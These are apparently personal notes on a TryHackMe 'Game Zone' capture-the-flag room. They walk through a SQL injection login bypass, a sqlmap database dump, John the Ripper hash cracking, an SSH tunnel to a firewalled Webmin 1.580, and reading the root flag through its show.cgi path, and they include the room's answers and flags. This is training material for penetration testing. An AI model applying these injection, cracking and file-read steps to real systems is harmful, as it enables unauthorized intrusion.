#HashCracking #SQL 

Learn to hack into this machine. Understand how to use SQLMap, crack some passwords, reveal services using a reverse SSH tunnel and escalate your privileges to root!

This room will cover SQLi (exploiting this vulnerability manually and via SQLMap), cracking a users hashed password, using SSH tunnels to reveal a hidden service and using a metasploit payload to gain root privileges.

---
`10.10.163.142`
`nmap -sV 10.10.163.142` = 22 ssh, 80 http

What is the name of the large cartoon avatar holding a sniper on the forum?

- hint= Reverse Image Search
- `http://10.10.163.142:80` Game Zone website 
- source code, `index.php`, `images/userlogin_enter.gif`, header image but no name, search image
- google images > `agent 47`
---

## SQLi

SQL is a standard language for storing, editing and retrieving data in databases.
- `SELECT * FROM users WHERE username =: username AND password := password`

In our GameZone machine, when you attempt to login, it will take your inputted values from your username and password, then insert them directly into the query above
- place for attack with SQL query
- username `admin`
- password ` ' or 1=1--`   fails as no admin in database

The extra SQL we inputted as our password has changed the above query to break the initial query and proceed (with the admin user) if `1==1` then comment the rest of the query to stop it breaking

- username ` ' or 1=1 -- -`   need 3rd dash!
- no password
- now @ `/portal.php`

## SQLmap

SQLMap is a popular open-source, automatic SQL injection and database takeover tool. This comes pre-installed on all version of [Kali Linux](https://tryhackme.com/rooms/kali) or can be manually downloaded and installed [here](https://github.com/sqlmapproject/sqlmap).

different types of SQL injection 
- boolean
- time based

Use SQLmap to dump the entire database for GameZone and point SQLmap to the game review search feature
- need to use BurpSuite 
- Game Zone portal type `test` in game review search bar while Burp Proxy > Intercept

burp browser > allow burp browser
open burp browser > go to the ip:80 > SQLi attack (no password) > Burp: Forward request > type `test` in the search bar > Burp: forward > Action: copy to file > save request `request.txt`

we can pass this request.txt file to SQLmap to use our authenticated user session
- `sqlmap -r request.txt --dbms=mysql --dump`
- enter `y` to every query

In the users table, what is the hashed password?
- ` ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14 `

What was the username associated with the hashed password?
- `agent47`

What was the other table name?
- scroll up in terminal
- `post`

## John the Ripper

John the Ripper (JTR) is a fast, free and open-source password cracker. This is also pre-installed on all Kali Linux machines.

`nano hash.txt` > paste in the hash from above

`john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256`

What is the de-hashed password?
- use the command above
- ` videogamer124 `

we have username: `agent47`
we have password: `videogamer124`

Try SSH'ing onto the machine.

What is the user flag?
- `ssh agent47@10.10.163.142`
- `videogamer124`
- ls > user.txt
- ` 649ac17b1480ac13ef1e4fa579dac95c `

## reverse SSH

reverse SSH port forwarding specifies that the given port on the remote server host is to be forwarded to the given host and port on the local side.

- `-L`  is local tunnel {YOU <--- Client} if a site was blocked you can forward the traffic to a server you own & view it	
- if imgur.com was blocked at work, you can `ssh -L 9000:imgur.com:80 user@example.com` going to localhost:9000 on your machine will load imgur
- `-R` is remote {YOU --> Client}  you forward your traffic to other server for others to view

use a tool `ss` to investigate sockets running on a host
- `ss -tulpn`

|   |   |
|---|---|
|**Argument**|**Description**|
|-t|Display TCP sockets|
|-u|Display UDP sockets|
|-l|Displays only listening sockets|
|-p|Shows the process using the socket|
|-n|Doesn't resolve service names|

< still logged in the SSH >

How many TCP sockets are running?
- `ss -tulpn`
- 5
- 
![[Screen Shot 2023-10-06 at 11.30.33 AM.png]]

We can see that a service running on port 10000 is blocked via a firewall rule from the outside (we can see this from the IPtable list). However, Using an SSH Tunnel we can expose the port to us (locally)!

From our local machine, run
- exit previous SSH session
- `ssh -L 10000:localhost:10000 <username>@<ip>`
- now we have a webserver

What is the name of the exposed CMS?
- `webmin`

  
What is the CMS version?
- `agent47:videogamer124`
- source code `Webmin 1.580`

Using the CMS dashboard version, use Metasploit to find a payload to execute against the machine.

What is the root flag?
- hint= The correct payload will also give you root access. Flag located at /root/root.txt
- add this to the url in browser `localhost:10000` + `/file/show.cgi/root/root.txt`
- ` a4b945830144bdd71908d12d902adeee `

---
### reference 
- https://medium.com/@antonyn/tryhackme-gamezone-1a5b13fbdf2a

